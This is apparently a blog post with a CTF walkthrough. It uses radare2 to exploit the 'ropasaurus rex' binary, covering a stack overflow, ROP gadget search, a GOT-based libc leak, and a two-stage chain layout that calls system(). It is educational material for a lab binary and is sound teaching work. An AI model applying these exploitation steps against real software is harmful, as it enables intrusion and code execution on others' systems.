---
layout: post
title: "pwning with radare2"
date: 2014-11-23 22:42:33 -0500
comments: true
categories: ctf pwning radare2
---
radare2 is a very cool set of tools that you probably don't know how to use!
Let's go through a simple exploit CTF challenge to understand how to use it for
exploit development.

We'll be focusing on "ropasaurus rex" which is a simple challenge from Plaid CTF
After checking out the latest and greatest radare from git, let's get started!

Open up ropasaurusrex in r2 and call analyze on the binary.
We can list the functions with "afl"

![Imgur](http://i.imgur.com/18NyivR.png)

First thing to do, let's see how the binary looks. To disassemble, r2 uses the
`pd` directive. So let's disassemble the main function with `pdf @ main`

![Imgur](http://i.imgur.com/PAFblNt.png)

Ok so main is a very simple function. We can "decompile" it by hand.

```
int main() {
  fcn.0x80483f4();
  sym.imp.write(stdout, str.WIN_n, 4);  // write is fd, string, len
}
```
We can print the string to see what is being printed.

![Imgur](http://i.imgur.com/Sp4IZjw.png)

Ok, so time to see what happens in 0x80483f4

![Imgur](http://i.imgur.com/yZW400k.png)

Great, this function is also very simple.
Let's reverse it!

```
sub_0x80483f4() {
  char buffer[0x88];
  sym.imp.read(stdin, buffer, 0x100);
}
```

So we see that 0x100 (256) bytes are read in.
"buffer" is on the stack size 0x88. This is size 136. We read in 256 bytes on
the stack buffer which is only size 136. Great, we found the vulnerability, but
don't stop now, Let's get a shell, radare2 has some more tools that can help us
with that.

Let's check what protections are on the binary. We know our machine runs with
ASLR (and if your's doesn't why not!?!?)

I like to use the tool "checksec.sh" from trapkit.de

![Imgur](http://i.imgur.com/Hu0YuI9.png)

Looks like nx is enabled. So, we're going to need to rop!
First thing to do, is find out how big our buffer is so that we can take control
of EIP.

ragg2 + radare2 can be used with De Bruijn patterns to find the offset.
We use ragg2 to generate the pattern, and r2 to find how far into the pattern
before the return address on the stack is overwritten.

![Imgur](http://i.imgur.com/mPxdxJJ.png)

Ok, great, so the exploit can be [140 bytes of padding|start of rop chain]

Because we have both read and write libc functions, we can create a rop chain
that will do the following.

- Leak libc address of write
  - Compute offset of `system` with the provided libc (I'm using mine here on
ubuntu)
- Write our command to somewhere.
- Return to vulnerable function, now we know the location of `system`
- Call `system` with our written string.

So first, we should find the locations of `read` and `write` in the PLT

![Imgur](http://i.imgur.com/wIS8uFD.png)

```
[0xf77db0d0]> afl |grep read
0x0804832c  6  1  sym.imp.read
[0xf77db0d0]> afl |grep write
0x0804830c  6  1  sym.imp.write
```
ok, so we can call either of those there.

As for the GOT, we can find it like so

![Imgur](http://i.imgur.com/9B7LamN.png)

To leak a libc address we'll want to read from the GOT entry of a known libc
function. We can see that read is in the GOT at 0x804961c.
Write is done as such.
```
ssize_t write(int fildes, const void *buf, size_t nbyte);
```
So something like this is what we want.
```
write(1 /*stdout*/, 0x804961c /*read@got*/, 4 /*size to read*/);
```
But then, how do we clean up the stack to go to our next function which is to
write our command? We need to pop 3 items off of the stack, and set the return
address to read. So first, let's find how to pop off the stack.
r2 has some great rop gadget search tools, so we need to find gadgets that do
the following.
```
pop ?
pop ?
pop ?
ret
```
Where `?` can be any register, we don't really care. This cleans up the stack
and gets us to the next return address. We can use the `/R` command for finding
gadgets.
```
[0x08048440]> /R  pop,pop,pop,ret
```
r2 gives us back a bunch of example gadgets. I see one here which looks nice.
```
  0x080484b6           5e  pop esi
  0x080484b7           5f  pop edi
  0x080484b8           5d  pop ebp
  0x080484b9           c3  ret
```
I'll refer to this as "pppr" for poppoppopret.
So, stage 1 of our payload can look like this
```
STAGE 1
--frame_1--
[write@plt]
[pppr     ] // return address
[1        ]
[read@got ]
[4        ]
--frame_2--
[??       ]
```
Next, we need to find a place to write our command string to system.
We can use the read function to do that. Read looks like this
```
ssize_t read(int fd, void *buf, size_t count);```
```
So let's do
```
read(0 /*stdin*/, target, length of command);
```
We now need a place to read the string to. ELF has different sections, with
different permissions. Some are read only, write only, execute only, or any
combination of the three! rabin2 lets us see the secitions and find the
permissions and sizes of each, so we can tell where to write to.
![Imgur](http://i.imgur.com/YsU1Blx.png)
Perfect! there are plenty of sections. Generally I like to write to the `.bss`
section, but this is only size 8, which would limit our command. So let's pick
the `.dynamic` section. It is size 208, and we can write to it.
```
idx=20 vaddr=0x08049530 paddr=0x00000530 sz=208 vsz=208 perm=-rw- name=.dynamic
```
We'll reuse the same pppr gadget, because write has the same number of args.
So now our rop chain can be.
I'll call 0x08049530 writeaddr, and len(cmd) the length of our command.
So this now leaks the libc address of read. Then calls read from stdin to a
memory address that we can write to. Then we need to return to our vulnerable
function to then execute the system address that we calculate.
```
STAGE 1
--frame_1--
[write@plt]
[pppr     ] // return address
[1        ]
[read@got ]
[4        ]
--frame_2--
[read@plt ]
[pppr     ]
[0        ]
[writeaddr]
[len(cmd) ]
--frame_3--
[vuln_func]
```
In my libc, we can find the offsets of read and system. Because we leak the
libc address of read, we can compute where system is by doing the following
math.
```
offset = libc_read - libc_system
sys_addr = leaked_read_addr - offset
```
I get the following addresses, using gdb instead of r2, because I dont know
how to do this quickly in r2 ;)
```
minishwoods old/ropasaurusrex » gdb -q /lib/i386-linux-gnu/libc.so.6
Reading symbols from /lib/i386-linux-gnu/libc.so.6...(no debugging symbols found)...done.
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0x40100 <system>
gdb-peda$ p read
$2 = {<text variable, no debug info>} 0xdb4b0 <read>
```
Now all that is left is to do the same stack smash, then call system.
System looks like this
```
int system(const char *command);
```
So we just want
```
system(0x08049530 /*address of the string we wrote*/);
```
Then were done! Stage 2 of the rop can be like this
```
STAGE 2
--frame_1--
[system   ]
[JUNK     ] //can be any 4 bytes, we dont care once we execute system()
[writeaddr]
```
Put it all together in a neat exploit like this
https://gist.github.com/48bcb49cb71f96b98367
and were all done!

